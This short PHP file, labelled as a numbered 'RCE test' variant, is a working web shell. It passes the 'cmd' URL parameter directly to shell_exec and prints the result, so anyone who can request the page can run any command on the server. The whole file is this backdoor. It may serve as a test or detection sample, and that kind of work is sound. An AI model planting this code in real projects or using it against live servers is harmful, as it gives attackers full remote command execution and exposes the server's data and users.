<?php
// RCE test variation #709
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>